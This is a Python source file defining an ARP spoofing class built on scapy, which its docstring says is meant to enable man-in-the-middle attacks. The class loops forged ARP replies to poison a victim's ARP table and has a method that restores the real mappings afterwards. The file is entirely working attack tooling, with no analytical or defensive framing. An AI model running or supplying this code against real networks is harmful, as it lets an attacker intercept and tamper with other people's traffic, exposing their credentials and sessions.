#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import logging
import sys
import time
import traceback
import scapy.all as scapy
from threading import Thread


class ArpSpoofer:
    """
    This class is used to enable MITM attacks with ARP spoofing.
    """

    def __init__(self):
        self.logger = logging.getLogger()
        self.isRunning = False
        self.targetIp = None
        self.spoofIp = None

    def _spoof(self, targetIp, spoofIp):
        """
        Spoof the target's ARP table by sending a fake ARP response with our MAC address as the sender.
        
        :param targetIp: The victim's IP address
        :param spoofIp: The IP address to spoof
        """
        targetMac = scapy.getmacbyip(targetIp)
        self.logger.debug(f"Target IP address: {targetIp}")
        self.logger.debug(f"Target MAC address: {targetMac}")
        if targetMac == None:
            self.logger.error(f"ARP request for IP address {targetIp} failed! Target is not reachable!")
            sys.exit(1)
        else:
            while self.isRunning:
                self.logger.debug(f"Tell target {targetIp} that spoofed IP address {spoofIp} is at our MAC address")
                packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=(spoofIp))
                scapy.send(packet, verbose=False)
                time.sleep(1)

    def _restore(self, targetIp, source_ip):
        """
        Restore the target's ARP table by sending a real ARP response.
        This is done by sending the target the spoofed IP address and the real MAC address of the spoofed IP address.

        :param targetIp: The victim's IP address
        :param source_ip: The spoofed IP address
        """
        try:
            self.logger.info(f"Restoring ARP tables for target {targetIp} and spoofed IP address {source_ip}")
            self.logger.debug(f"Tell target {targetIp} the correct MAC-Adress for spoofed IP address {source_ip}")
            destination_mac = scapy.getmacbyip(targetIp)
            source_mac = scapy.getmacbyip(source_ip)
            packet = scapy.ARP(op=2, pdst=targetIp, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
            scapy.send(packet, verbose=False)
        except Exception as e:
            self.logger.error(f"Error while restoring ARP tables: {e}")
            if self.logger.level == logging.DEBUG:
                traceback.print_exc()

    def start(self, targetIp, spoofIp):
        """
        Start the ARP spoofing process.

        :param targetIp: The victim's IP address
        :param spoofIp: The IP address to spoof
        """
        self.targetIp = targetIp
        self.spoofIp = spoofIp
        self.isRunning = True

        self.logger.info(f"Starting ARP spoofing for target {targetIp} and spoofing IP address {spoofIp}")
        t1 = Thread(target=self._spoof, args=(targetIp, spoofIp))
        t1.start()
        
    def stop(self):
        """
        Stop the ARP spoofing process.
        """
        if self.isRunning and self.targetIp and self.spoofIp:
            self.logger.info(f"Stopping ARP spoofing for target {self.targetIp}")
            self.isRunning = False
            self._restore(self.targetIp, self.spoofIp)
        else:
            self.logger.error("ARP spoofing is not running")


